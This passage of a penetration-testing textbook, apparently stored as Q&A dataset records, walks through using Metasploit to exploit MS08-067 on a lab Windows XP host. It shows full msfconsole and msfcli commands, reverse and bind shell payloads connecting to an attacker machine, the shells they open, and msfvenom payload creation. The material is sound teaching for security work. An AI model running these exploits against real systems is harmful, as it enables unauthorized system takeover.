0;\n}\n}\nListing 3-9: “Hello World” C program\nThe syntax for C is a bit different from that of Python and Bash. Because\nour code will be compiled, we don’t need to tell the terminal which inter-\npreter to use at the beginning of our code. First, as with our Python example,\nwe import a C library. In this case we’ll import the stdio (short for standard\ninput and output) library, which will allow us to accept input and print\noutput to the terminal. In C, we import stdio with the command #include\n<stdio.h> u. Every C program has a function called main v that is run when the\nprogram starts. Our program will take a command line argument, so we\npass an integer argc and a character array argv to main. argc is the argument\ncount, and argv is the argument vector, which includes any command line\narguments passed to the program. This is just standard syntax for C pro-\ngrams that accept command line arguments. (In C, the beginning and end\nof functions, loops, and so on are denoted by braces {}.)\nFirst, our program checks to see if a command line argument is pres-\nent. The argc integer is the length of the argument array; if it is less than\ntwo (the program name itself and the command line argument), then a\ncommand line argument has not been given. We can use an if statement\nto check w. The syntax for if is also a little different in C. As with our Bash script, if\na command line argument is not given, we can prompt the user with usage\ninformation x. The printf function allows us to write output to the termi-\nnal. Also note that statements in C are finished with a semicolon (;). Once\n84 Chapter 3\nwe’re through with our program, we use a return statement y to finish the\nfunction main. If a command line argument is supplied, our else statement\ninstructs the program to say hello z. (Be sure to use braces to close all of\nyour loops and the main function.)\nBefore we can run our program, we need to compile it with GCC as\nshown here. Save the program as cprogram.c. root@kali:~# gcc cprogram.c -o cprogram\nUse the -o option to specify the name for the compiled program and\nfeed your C code to GCC. Now run the program from your current direc-\ntory. If the program is run with no arguments, you should see usage infor-\nmation as shown here. root@kali:~# ./cprogram\nPass your name as an argument\nIf instead we pass it an argument, in this case our name, the program\ntells us hello. root@kali:~# ./cprogram georgia\nHello georgia\nnote We will look at another C programming example in Chapter 16, where a little bit of\nsloppy C coding leads to a buffer overflow condition, which we will exploit. summary\nIn this chapter we’ve looked at simple programs in three different languages. We looked at basic constructs, such as saving information in variables for\nlater use. Additionally, we learned how to use conditionals, such as if state-\nments, and iterations, such as for loops, to have the program make decisions\nbased on the provided information. Though the syntax used varies from pro-\ngramming language to programming language, the ideas are the same. Programming 85\n4\nusing tHe\nme tasPloit fr ame work\nIn subsequent chapters, we’ll take an in-depth look at\nthe phases of penetration testing, but in this chapter,\nwe’ll dive right in and get some hands-on experience\nwith exploitation. Though the information-gathering\nand reconnaissance phases often have more bear-\ning on a pentest’s success than exploitation does, it’s\nmore fun to gather shells (a remote connection to\nan exploited target) or trick users into entering their\ncompany credentials into your cloned website. In this chapter we’ll work with the Metasploit Framework, a tool that\nhas become the de facto standard for penetration testers. First released in\n2003, Metasploit has reached cult status in the security community. Though\nMetasploit is now owned by the security company Rapid7, an open source\nedition is still available, with development largely driven by the security\ncommunity. Metasploit’s modular and flexible architecture helps developers effi-\nciently create working exploits as new vulnerabilities are discovered. As\nyou’ll see, Metasploit is intuitive and easy to use, and it offers a centralized\nway to run trusted exploit code that has been vetted for accuracy by the\nsecurity community. Why use Metasploit? Say you’ve discovered a vulnerability in your client\nenvironment—the Windows XP system at 192.168.20.10 is missing Microsoft\nsecurity bulletin MS08-067. As a penetration tester, it is up to you to exploit\nthis vulnerability, if possible, and assess the risk of a compromise. One approach might be to set up in your lab a Windows XP system that\nis also missing this patch, attempt to trigger the vulnerability, and develop a\nworking exploit. But developing exploits by hand takes both time and skill,\nand the window of opportunity for your pentest may be closing. You could instead search for code that exploits this vulnerability on\nthe Internet. Sites like Packet Storm Security (http://www.packetstormsecurity\n.com/), SecurityFocus (http://www.securityfocus.com/), and Exploit Database\n(http://www.exploit-db.com/) provide repositories of known exploit code. But be forewarned: Not all public exploit code does what it claims to do. Some exploit code may destroy the target system or even attack your system\ninstead of the target. You should always be vigilant when running anything\nyou find online and read through the code carefully before trusting it. Addi-\ntionally, the public exploits you find may not meet your needs right out of\nthe box. You may need to do some additional work to port them to your\npentest environment. Whether we develop an exploit from scratch or use a public one as a\nbase, we will still need to get that exploit to work on your pentest. Our time\nwill probably be better spent on tasks that are difficult to automate, and\nluckily, we can use Metasploit to make exploiting known vulnerabilities\nsuch as MS08-067 quick and painless. starting metasploit\nLet’s start Metasploit and attack our first system. In Kali Linux, Meta sploit\nis in our path, so we can start it anywhere on the system. But before you\nstart Metasploit, you will want to start the PostgreSQL database, which\nMetasploit will use to track what you do. root@kali:~# service postgresql start\nNow you’re ready to start the Metasploit service. This command creates\na PostgreSQL user called msf3 and a corresponding database to store our\ndata. It also starts Metasploit’s remote procedure call (RPC) server and web\nserver.\n\nroot@kali:~# service metasploit start\n88 Chapter 4\nThere are multiple interfaces for using Metasploit. In this chapter\nwe’ll use Msfconsole, the Metasploit text-based console, and Msfcli, the\ncommand line interface. Either interface can be used to run Metasploit\nmodules, though I tend to spend most of my time in Msfconsole. Start the\nconsole by entering msfconsole. root@kali:~# msfconsole\nDon’t be alarmed if Msfconsole appears to hang for a minute or two;\nit’s loading the Metasploit module tree on the fly. Once it’s finished, you’ll\nbe greeted by some clever ASCII art, a version listing and other details, and\nan msf > prompt (see Listing 4-1). , ,\n/ \\\n((__---,,,---__))\n(_) O O (_)_________\n\\ _ / |\\\no_o \\ M S F | \\\n\\ _____ | *\n||| WW|||\n||| |||\nLarge pentest? List, sort, group, tag and search your hosts and services\nin Metasploit Pro -- type 'go_pro' to launch it now. =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]\n+ -- --=[ 1246 exploits - 678 auxiliary - 198 post\n+ -- --=[ 324 payloads - 32 encoders - 8 nops\nmsf >\nListing 4-1: Starting Msfconsole\nNotice in Listing 4-1 that, as of this writing, Metasploit had 1,246 exploits,\n678 auxiliary modules, and so forth. No doubt by the time you read this,\nthese numbers will be even larger. New modules are always being added to\nMetasploit, and because Metasploit is a community-driven project, anyone\ncan submit modules for inclusion in the Metasploit Framework. (In fact, in\nChapter 19, you’ll learn how to write your own modules and gain immortal-\nity as a Metasploit author.)\nIf you’re ever stuck when using Msfconsole, enter help for a list of avail-\nable commands and a description of what they do. For more detailed infor-\nmation about a specific command, including usage, enter help <command name>. For example, the help information for using Metasploit’s route com-\nmand is shown in Listing 4-2. Using the Metasploit Framework 89\nmsf > help route\nUsage: route [add/remove/get/flush/print] subnet netmask [comm/sid]\nRoute traffic destined to a given subnet through a supplied session. The default comm is Local... Listing 4-2: Help information in Metasploit\nFinding metasploit modules\nLet’s look at how we might use Metasploit to exploit an unpatched vulnera-\nbility in our Windows XP target. We will exploit the vulnerability patched\nin Microsoft Security Bulletin MS08-067. A natural question you may have\nis, how do we know this patch is missing on our Windows XP target? In\nsubsequent chapters, we will walk through the steps of discovering this vul-\nnerability as well as several others on our target systems. For now, just trust\nme that this is the vulnerability we would like to exploit. MS08-067 patched an issue in the netapi32.dll that could allow attack-\ners to use a specially crafted remote procedure call request via the Server\nMessage Block (SMB) service to take over a target system. This vulnerability\nis particularly dangerous because it does not require an attacker to authen-\nticate to the target machine before running the attack. MS08-067 gained\neternal infamy as the vulnerability exploited by the Conficker worm, which\nwas widely reported in the media. Now, if you’re familiar with Microsoft patches, you may recognize that\nthis one is from 2008. Considering its age, you may be surprised to learn\nhow often the vulnerability it patched can still lead to success in penetra-\ntion testing, even today, particularly when assessing internal networks. Metasploit’s MS08-067 module is simple to use and has a high success rate,\nmaking it an ideal first example. Our first step in using Metasploit is to find\na module that exploits this particular vulnerability. We have a few options. Usually, a simple Google search will find what you need, but Metasploit\nalso has an online database of modules (http://www.rapid7.com/db/modules/)\nand a built-in search function that you can use to search for the correct\nmodules. The Module Database\nYou can use the Metasploit search page to match Metasploit modules to\nvulnerabilities by Common Vulnerabilities and Exposures (CVE) num-\nber, Open Sourced Vulnerability Database (OSVDB) ID, Bugtraq ID, or\nMicrosoft Security Bulletin, or you can search the full text of the module\ninformation for a string. Search for MS08-067 in the Microsoft Security\nBulletin ID field, as shown in Figure 4-1. 90 Chapter 4\nFigure 4-1: Searching the Metasploit Auxiliary Module & Exploit Database\nThe results of the search, shown in Figure 4-2, tell us the module name\nwe need as well as information about the module (which we’ll discuss in the\nnext section). Figure 4-2: MS08-067 Metasploit module page\nThe full name of the Metasploit module for the MS08-067 security\nbulletin is shown in the URI bar. In the modules directory of Metasploit,\nthis exploit is exploit/windows/smb/ms08_067_netapi. Built-In Search\nYou can also use Metasploit’s built-in search function to find the correct\nmodule name, as shown in Listing 4-3. Using the Metasploit Framework 91\nmsf > search ms08-067\nMatching Modules\n================\nName Disclosure Date Rank Description\n---- --------------- ---- -----------\nexploit/windows/smb/ms08_067_netapi 2008-10-28 00:00:00 UTC great Microsoft Server\nService Relative Path\nStack Corruption\nListing 4-3: Searching for a Metasploit module\nAgain we find that the correct module name for this vulnerability\nis exploit/windows/smb/ms08_067_netapi. Once you’ve identified a mod-\nule to use, enter the info command with the module name, as shown in\nListing 4-4. msf > info exploit/windows/smb/ms08_067_netapi\nuName: Microsoft Server Service Relative Path Stack Corruption\nvModule: exploit/windows/smb/ms08_067_netapi\nVersion: 0\nwPlatform: Windows\nxPrivileged: Yes\nLicense: Metasploit Framework License (BSD)\nyRank: Great\nz Available targets:\nId Name\n-- ----\n0 Automatic Targeting\n1 Windows 2000 Universal\n2 Windows XP SP0/SP1 Universal\n--snip--\n67 Windows 2003 SP2 Spanish (NX)\n{ Basic options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST yes The target address\nRPORT 445 yes Set the SMB service port\nSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\n| Payload information:\nSpace: 400\nAvoid: 8 characters\n} Description:\nThis module exploits a parsing flaw in the path canonicalization\ncode of NetAPI32.dll through the Server Service. This module is\ncapable of bypassing NX on some operating systems and service packs. The correct target must be used to prevent the Server Service (along\nwith a dozen others in the same process) from crashing. Windows XP\n92 Chapter 4\ntargets seem to handle multiple successful exploitation events, but\n2003 targets will often crash or hang on subsequent attempts. This\nis just the first version of this module, full support for NX bypass\non 2003, along with other platforms, is still in development. ~ References:\nhttp://www.microsoft.com/technet/security/bulletin/MS08-067.mspx\nListing 4-4: Information listing in Metasploit\nThis info page tells us a lot. • First we see some basic information about the module, including a\ndescriptive name at u followed by the module name at v. (The version\nfield formerly denoted the SVN revision for the module, but now that\nMetasploit is hosted on GitHub, all modules are set to version 0.)\n• Platform w tells us that this exploit is for Windows systems. • Privileged x tells us whether this module requires or grants high privi-\nleges on the target. The License is set to Metasploit Framework License\n(BSD). (Metasploit’s license is a three-clause BSD open source license.)\n• Rank y lists the exploit’s potential impact on the target. Exploits are\nranked from manual to excellent. An exploit ranked excellent should\nnever crash a service; memory-corruption vulnerabilities such as\nMS08-067 are usually not in this category. Our module is in the great\ncategory, one step down. A great exploit can automatically detect\nthe correct target and has other features that make it more likely to\nsucceed. • Available targets z lists operating system versions and patch levels that\nthe module can exploit. This module has 67 possible targets, including\nWindows 2000, Windows 2003, and Windows XP, as well as multiple ser-\nvice and language packs. • Basic options { lists various options for the module that can be set to\nmake a module better meet our needs. For example, the RHOST option\ntells Metasploit the IP address of the target. (We’ll discuss the basic\noptions in depth in “Setting Module Options” on page 94.)\n• Payload information | contains information to help Metasploit decide\nwhich payloads it can use with this exploit. Payloads, or shellcode, tell\nthe exploited system what to do on behalf of the attacker. (The goal of\nattacking a target is, of course, to get it to do something on our behalf\nthat it isn’t supposed to do.) Metasploit’s payload system gives us many\noptions for what to make the target do. • Description } includes more details about the particular vulnerability\nthat the module exploits. • References ~ contains a link to online vulnerability database entries. If\nyou’re ever in doubt about which Metasploit module to use for a vulner-\nability, start with its info page. Using the Metasploit Framework 93\nHaving confirmed that this is the right module, tell Metasploit to use\nthis module with the command use windows/smb/ms08_067_netapi. You can\ndrop the exploit/ part of the exploit name; Metasploit will figure out what\nyou want. msf > use windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) >\nNow we’re in the context of the exploit module. setting module options\nHaving chosen our exploit, we need to give Metasploit some informa-\ntion. As you’ll see throughout this book, Metasploit can aid you in many\naspects of penetration testing, but it isn’t a mind reader . . . yet. To see the\ninformation Metasploit needs from you to run your chosen module, enter\nshow options (Listing 4-5). msf exploit(ms08_067_netapi) > show options\nModule options (exploit/windows/smb/ms08_067_netapi):\nName Current Setting Required Description\n---- --------------- -------- -----------\nuRHOST yes The target address\nvRPORT 445 yes Set the SMB service port\nwSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\nExploit target:\nId Name\n-- ----\nx0 Automatic Targeting\nmsf exploit(ms08_067_netapi) >\nListing 4-5: Exploit module options\nAt the top of the output shown in Listing 4-5 are the module settings\nand any default values, whether certain settings are required for the mod-\nule to run successfully, and a description of each setting.\n\nRHOST\nThe RHOST option u refers to the remote host we want to exploit. This\noption is required because it gives Metasploit a target to attack. We’ll\ntell Metasploit to exploit the Windows XP target machine that we set up\nin Chapter 1 by changing the RHOST option from blank to our target IP\naddress. (If you can’t remember what that is, on the Windows XP machine\n94 Chapter 4\nrun ipconfig at the command line to find out.) To set an option enter set\n<option to set> <value to set it to>, so in this case, set RHOST 192.168.20.10.\n(Remember to use your own Windows XP target’s IP address.) After issuing\nthis command, running show options again should show that the value of\nRHOST is set to 192.168.20.10.\n\nRPORT\nRPORT v refers to the remote port to attack. I remember a former manager\nof mine who spent a good amount of time looking for port 80—as in try-\ning to locate it physically. Unsatisfied with my explanation that networking\nsockets are made entirely of code, I eventually just pointed at the Ethernet\nport. The moral of this story is this: A port is just a network socket; it’s not a\nphysical port. For example, when you browse to www.google.com, a web server\nsomewhere on the Internet is listening on port 80.\nIn this case we see that RPORT is set to a default value. Because our exploit\nuses the Windows SMB service, the RPORT value should probably be 445, the\ndefault port for SMB. And, as you can see, Metasploit saves us the trouble of\nhaving to set the value by setting the default to 445 (which you can change\nif you need to). In our case, we can just leave it alone.",
    "question": "What is the purpose of the Metasploit Framework and how is it used to exploit known vulnerabilities like MS08-067?",
    "summary": "This chapter introduces the Metasploit Framework, a standard tool for penetration testers, and demonstrates how to use it to exploit a known vulnerability, such as MS08-067. It covers basic programming concepts in three languages and shows how to use Metasploit's console and search functions to find and use the right exploit module. The chapter also explains how to set up and use the MS08-067 exploit module to test a Windows XP system."
  },
  {
    "start": 29,
    "end": 32,
    "text": "SMBPIPE\nLike the RPORT value, keep the default for the SMBPIPE option w as BROWSER. This will work just fine for our purposes. (SMB pipes allow us to talk to\nWindows interprocess communication over a network. We’ll look at find-\ning out which SMB pipes are listening on our target machines later in this\nchapter.)\nExploit Target\nThe Exploit Target is set to 0 Automatic Targeting x. This is the target oper-\nating system and version. You can view the available targets on the module’s\ninfo page or just show them with the command show targets (Listing 4-6). msf exploit(ms08_067_netapi) > show targets\nExploit targets:\nId Name\n-- ----\n0 Automatic Targeting\n1 Windows 2000 Universal\n2 Windows XP SP0/SP1 Universal\n3 Windows XP SP2 English (AlwaysOn NX)\n4 Windows XP SP2 English (NX)\n5 Windows XP SP3 English (AlwaysOn NX)\n--snip--\n67 Windows 2003 SP2 Spanish (NX)\nListing 4-6: Exploit targets\nUsing the Metasploit Framework 95\nAs you can see in Listing 4-6, this module can attack Windows 2000,\nWindows 2003, and Windows XP. note Remember, Microsoft has released patches for all the platforms affected by this bug,\nbut keeping all systems in an environment up-to-date with Windows patches is easier\nsaid than done. Many of your pentesting clients will be missing some critical updates\nin Windows and other software. We know that our target is running Windows XP SP3 English, so we can\nwager that the correct target number is either 5 or 6, but it won’t always be\nso easy. Choose Automatic Targeting to tell Metasploit to fingerprint the SMB\nservice and choose the appropriate target based on the results. To set a target option, enter set target <target number>. In this case we’ll\nleave the module target at the default Automatic Targeting and move on. Payloads (or shellcode)\nBased on the output of show options command, it looks like everything should\nbe ready to go at this point, but we’re not quite done yet. We’ve forgotten to\ntell our exploit what to do once the target has been exploited. One of the\nways that Metasploit makes things easier is by setting up our payloads for us. Metasploit has a plethora of payloads, ranging from simple Windows com-\nmands to the extensible Metasploit Meterpreter (see Chapter 13 for more\ndetailed information on Meterpreter). Just select a compatible payload, and\nMetasploit will craft your exploit string, including the code to trigger the\nvulnerability and the payload to run after exploitation is successful. (We’ll\nlook at writing exploits by hand in Chapters 16 through 19.)\nFinding Compatible Payloads\nAs of this writing there were 324 payloads in Metasploit, and like exploit\nmodules, new payloads are added to the Framework regularly. For instance,\nas mobile platforms take over the world, payloads for iOS and other smart-\nphones are starting to show up in Metasploit. But, of course, not all 324 pay-\nloads are compatible with our chosen exploit. Our Windows system will be a\nbit confused if it receives instructions that are meant for an iPhone. To see\ncompatible payloads, enter show payloads, as shown in Listing 4-7. msf exploit(ms08_067_netapi) > show payloads\nCompatible Payloads\n===================\nName Disclosure Date Rank Description\n---- --------------- ---- -----------\ngeneric/custom normal Custom Payload\ngeneric/debug_trap normal Generic x86 Debug Trap\ngeneric/shell_bind_tcp normal Generic Command Shell, Bind TCP\nInline\n96 Chapter 4\ngeneric/shell_reverse_tcp normal Generic Command Shell, Reverse\nInline\ngeneric/tight_loop normal Generic x86 Tight Loop\nwindows/dllinject/bind_ipv6_tcp normal Reflective DLL Injection, Bind\nTCP Stager (IPv6)\nwindows/dllinject/bind_nonx_tcp normal Reflective DLL Injection, Bind\nTCP Stager (No NX or Win7)\nwindows/dllinject/bind_tcp normal Reflective DLL Injection, Bind\nTCP Stager\nwindows/dllinject/reverse_http normal Reflective DLL Injection, Reverse\nHTTP Stager\n--snip--\nwindows/vncinject/reverse_ipv6_http normal VNC Server (Reflective Injection),\nReverse HTTP Stager (IPv6)\nwindows/vncinject/reverse_ipv6_tcp normal VNC Server (Reflective Injection),\nReverse TCP Stager (IPv6)\n--snip--\nwindows/vncinject/reverse_tcp normal VNC Server (Reflective Injection),\nReverse TCP Stager\nwindows/vncinject/reverse_tcp_allports normal VNC Server (Reflective Injection),\nReverse All-Port TCP Stager\nwindows/vncinject/reverse_tcp_dns normal VNC Server (Reflective Injection),\nReverse TCP Stager (DNS)\nListing 4-7: Compatible payloads\nIf you forget to set a payload, you may find that, miraculously, the exploit\nmodule will just choose the default payload and associated settings and run\nit anyway. Still, you should get in the habit of manually setting a payload and\nits options because the default won’t always fit your needs. A Test Run\nLet’s keep things simple and send off our exploit with the default payload\noptions first, just to see how things work. Enter exploit to tell Metasploit to\nrun the module, as shown in Listing 4-8. msf exploit(ms08_067_netapi) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\n[*] Attempting to trigger the vulnerability... [*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1334) at\n2015-08-31 07:37:05 -0400\nmeterpreter >\nListing 4-8: Running the exploit\nUsing the Metasploit Framework 97\nAs you can see, we end up with a Meterpreter session. Meterpreter is\nshort for meta-interpreter, Metasploit’s unique payload. I often describe it as\na shell on steroids. It can do everything a command shell can do and much,\nmuch more. We’ll cover Meterpreter in depth in Chapter 13, but to get a\nhead start, enter help in the Meterpreter console for a list of Meterpreter’s\ncommands. note Another thing to note about the default options is that Metasploit uses the port 4444. In our lab there is nothing wrong with this. It will work just fine. However, on real\nengagements, if your client is using even primitive intrusion-prevention software, it\nmay take note of traffic on port 4444 and say, “Hey, you are Metasploit, go away!”\nand drop your connection. For now, let’s close our Meterpreter session and learn more about select-\ning payloads manually. As useful as Meterpreter is, you may find yourself\nin situations where it is not the ideal payload to meet your needs. Type exit\ninto your Meterpreter prompt to return to the regular Metasploit console. meterpreter > exit\n[*] Shutting down Meterpreter... [*] Meterpreter session 1 closed. Reason: User exit\nmsf exploit(ms08_067_netapi) >\ntypes of shells\nIn the list of compatible payloads shown in Listing 4-7, you see a range of\noptions including command shells, Meterpreter, a speech API, or execution\nof a single Windows command. Meterpreter or otherwise, shells fall into two\ncategories: bind and reverse. Bind Shells\nA bind shell instructs the target machine to open a command shell and listen\non a local port. The attack machine then connects to the target machine on\nthe listening port. However, with the advent of firewalls, the effectiveness\nof bind shells has fallen because any correctly configured firewall will block\ntraffic to some random port like 4444. Reverse Shells\nA reverse shell, on the other hand, actively pushes a connection back to the\nattack machine rather than waiting for an incoming connection. In this\ncase, on our attack machine we open a local port and listen for a connec-\ntion from our target because this reverse connection is more likely to make\nit through a firewall. 98 Chapter 4\nnote You may be thinking, “Was this book written in 2002 or something? My firewall has\negress filtering.” Modern firewalls allow you to stop outbound connections as well as\ninbound ones. It would be trivial to stop a host in your environment from connecting\nout, for instance, to port 4444. But say I set up my listener on port 80 or port 443. To a firewall, that will look like web traffic, and you know you have to let your users\nlook at Facebook from their workstations or there would be mutiny and pandemonium\non all sides. setting a Payload manually\nLet’s select a Windows reverse shell for our payload. Set a payload the same\nway you set the RHOST option: set payload <payload to use>. msf exploit(ms08_067_netapi) > set payload windows/shell_reverse_tcp\npayload => windows/shell_reverse_tcp\nBecause this is a reverse shell, we need to tell the target where to\nsend the shell; specifically, we need to give it the IP address of the attack\nmachine and the port we will listen on. Running show options again, shown\nin Listing 4-9, displays the module as well as the payload options. msf exploit(ms08_067_netapi) > show options\nModule options (exploit/windows/smb/ms08_067_netapi):\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST 192.168.20.10 yes The target address\nRPORT 445 yes Set the SMB service port\nSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\nPayload options (windows/shell_reverse_tcp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC thread yes Exit technique: seh, thread, process, none\nuLHOST yes The listen address\nLPORT 4444 yes The listen port\nExploit target:\nId Name\n-- ----\n0 Automatic Targeting\nListing 4-9: Module options with a payload\nUsing the Metasploit Framework 99\nLHOST u is our local host on the Kali machine, the IP address we want\nour target machine to connect back to. To find the IP address (if you have\nforgotten it), enter the Linux ifconfig command directly into Msfconsole. msf exploit(ms08_067_netapi) > ifconfig\n[*] exec: ifconfig\neth0 Link encap:Ethernet HWaddr 00:0c:29:0e:8f:11\ninet addr:192.168.20.9 Bcast:192.168.20.255 Mask:255.255.255.0\n--snip--\nNow set the LHOST option with set LHOST 192.168.20.9. Leave the defaults\nfor LPORT, for the local port to connect back to, as well as for EXITFUNC, which\ntells Metasploit how to exit. Now enter exploit, shown in Listing 4-10, to\nsend our exploit off again, and wait for the shell to appear. msf exploit(ms08_067_netapi) > exploit\n[*] Started reverse handler on 192.168.20.9:4444 u\n[*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX) v\n[*] Attempting to trigger the vulnerability... [*] Command shell session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1374)\nat 2015-08-31 10:29:36 -0400\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp. C:\\WINDOWS\\system32>\nListing 4-10: Running the exploit\nCongratulations: You have successfully exploited your first machine! Here’s what happened. When we enter exploit, Metasploit opens a lis-\ntener on port 4444 to catch the reverse shell from the target u. Then, since\nwe kept the target as the default Automatic Targeting, Metasploit finger printed\nthe remote SMB server and selected the appropriate exploit target for us v. Once it selected the exploit, Metasploit sent over the exploit string and\nattempted to take control of the target machine and execute our selected\npayload. Because the exploit succeeds, a command shell was caught by our\nhandler. To close this shell, type ctrl-C and enter y at the prompt to abort the\nsession. C:\\WINDOWS\\system32>^C\nAbort session 2? [y/N] y\n[*] Command shell session 2 closed\n\n.\n\nReason: User exit\nmsf exploit(ms08_067_netapi) >\n100 Chapter 4\nTo return to a Meterpreter shell, you can choose a payload with\nMeterpreter in the name such as windows/meterpreter/reverse_tcp and\nexploit the Windows XP target again. msfcli\nNow for another way to interact with Metasploit: the command line inter-\nface, Msfcli. Msfcli is particularly useful when using Metasploit inside scripts\nand for testing Metasploit modules that you’re developing because it lets\nyou run a module with a quick, one-line command. Getting Help\nTo run Msfcli, first exit Msfconsole by entering exit, or just open another\nLinux console. Msfcli is in our path, so we can call it from anywhere. Let’s\nbegin by looking at the help menu for Msfcli with msfcli -h (Listing 4-11). root@kali:~# msfcli -h\nu Usage: /opt/metasploit/apps/pro/msf3/msfcli <exploit_name> <option=value> [mode]\n==============================================================================\nMode Description\n---- -----------\n(A)dvanced Show available advanced options for this module\n(AC)tions Show available actions for this auxiliary module\n(C)heck Run the check routine of the selected module\n(E)xecute Execute the selected module\n(H)elp You're looking at it baby! (I)DS Evasion Show available ids evasion options for this module\nv(O)ptions Show available options for this module\nw(P)ayloads Show available payloads for this module\n(S)ummary Show information about this module\n(T)argets Show available targets for this exploit module\nListing 4-11: Msfcli help\nUnlike with Msfconsole, when using Msfcli, we can tell Metasploit every-\nthing it needs to know to run our exploit in just one command u. Luckily,\nMsfcli has some modes to help us build the final command. For example,\nthe O mode v shows the selected module’s options, and P shows the compat-\nible payloads w. Showing Options\nLet’s use our MS08-067 exploit against our Windows XP target again. According to the help page, we need to pass Msfcli the exploit name we\nwant to use and set all our options u. To show the available options use\nthe O mode. Enter msfcli windows/smb/ms08_067_netapi O to see the options\nfor the MS08-067 exploit module, as shown in Listing 4-12. Using the Metasploit Framework 101\nroot@kali:~# msfcli windows/smb/ms08_067_netapi O\n[*] Please wait while we load the module tree... Name Current Setting Required Description\n---- --------------- -------- -----------\nRHOST yes The target address\nRPORT 445 yes Set the SMB service port\nSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\nListing 4-12: Module options\nWe see the same options as we did in Msfconsole. We’re reminded to\nset the RHOST option to the IP address of the target machine, but as we saw\non the help page, setting options in Msfcli is a little different from doing do\nin Msfconsole. Here we say option=value. For example, to set RHOST, we enter\nRHOST=192.168.20.10. Payloads\nFor a reminder of the payloads compatible with this module, use the P mode. Try msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P, as shown in\nListing 4-13. root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P\n[*] Please wait while we load the module tree... Compatible payloads\n===================\nName Description\n---- -----------\ngeneric/custom Use custom string or file as payload. Set\neither PAYLOADFILE or PAYLOADSTR. generic/debug_trap Generate a debug trap in the target process\ngeneric/shell_bind_tcp Listen for a connection and spawn a command\nshell\ngeneric/shell_reverse_tcp Connect back to attacker and spawn a command\nshell\ngeneric/tight_loop Generate a tight loop in the target process\n--snip--\nListing 4-13: Module payloads in Msfcli\nThis time, we’ll use a bind shell payload. Recall that a bind shell just\nlistens on a local port on the target machine. It will be up to our attack\nmachine to connect to the target machine after the payload has run. Recall\nfrom our work in Msfconsole that choosing a payload requires additional\npayload-specific options, which we can view again with the O flag. Because our bind shell won’t be calling back to our attack machine, we\ndon’t need to set the LHOST option, and we can leave the LPORT option as the\n102 Chapter 4\ndefault of 4444 for now. It looks like we have everything we need to exploit\nthe Windows XP target again. Finally, to tell Msfcli to run the exploit we\nuse the E flag (Listing 4-14). root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10\nPAYLOAD=windows/shell_bind_tcp E\n[*] Please wait while we load the module tree... RHOST => 192.168.20.10\nPAYLOAD => windows/shell_bind_tcp\n[*] Started bind handler u\n[*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\n[*] Attempting to trigger the vulnerability... [*] Command shell session 1 opened (192.168.20.9:35156 -> 192.168.20.10:4444)\nat 2015-08-31 16:43:54 -0400\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp. C:\\WINDOWS\\system32>\nListing 4-14: Running the exploit in Msfcli\nIt looks like everything worked, and we got another shell. But this time,\ninstead of starting a reverse handler listening on the specified local port\nof 4444, Metasploit starts a handler for the bind shell u. After Metasploit\nsends over the exploit string, the bind handler will automatically connect\nout to the port specified by the payload and connect to the shell. Once\nagain, we have taken control of the target machine. Creating standalone Payloads with msfvenom\nIn 2011, Msfvenom was added to Metasploit. Prior to Msfvenom, the tools\nMsfpayload and Msfencode could be used together to create standalone\nencoded Metasploit payloads in a variety of output formats, such as Windows\nexecutables and ASP pages. With the introduction of Msfvenom, the func-\ntionality of Msfpayload and Msfencode was combined into a single tool,\nthough Msfpayload and Msfencode are still included in Metasploit. To view\nMsfvenom’s help page, enter msfvenom -h. So far with Metasploit, our goal has been to exploit a vulnerability on\nthe target system and take control of the machine. Now we’ll do something\na little different. Instead of relying on a missing patch or other security\nissue, we are hoping to exploit the one security issue that may never be fully\npatched: the users. Msfvenom allows you to build standalone payloads to\nrun on a target system in an attempt to exploit the user whether through a\nsocial-engineering attack (Chapter 11) or by uploading a payload to a vul-\nnerable server, as we’ll see in Chapter 8. When all else fails, the user can\noften be a way in. Using the Metasploit Framework 103\nChoosing a Payload\nTo list all the available payloads, enter msfvenom -l payloads. We’ll use one\nof Metasploit’s Meterpreter payloads, windows/meterpreter/reverse_tcp, which\nprovides a reverse connection with a Meterpreter shell. Use -p to select a\npayload. Setting Options\nTo see the correct options to use for a module, enter the -o flag after select-\ning a payload, as shown in Listing 4-15. root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -o\n[*] Options for payload/windows/meterpreter/reverse_tcp\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC process yes Exit technique: seh, thread, process,\nnone\nLHOST yes The listen address\nLPORT 4444 yes The listen port\nListing 4-15: Options in Msfvenom\nAs expected, our LHOST needs to be set, and our LPORT is set to the default\n4444. For practice, set LPORT to 12345 by entering LPORT=12345. We also see\nEXITFUNC, which we can leave as the default. Because this is a reverse connec-\ntion payload, we need to set our LHOST option to tell the target machine where\nto connect back to (our Kali machine). Choosing an Output Format\nNow tell Msfvenom which output format to use. Will we be running this pay-\nload from a Windows executable, or do we want to make an ASP file that\ncan be uploaded to a web server we have gained write access to? To see all\navailable output formats, enter msfvenom --help-formats. root@kali:~# msfvenom --help-formats\nExecutable formats\nasp, aspx, aspx-exe, dll, elf, 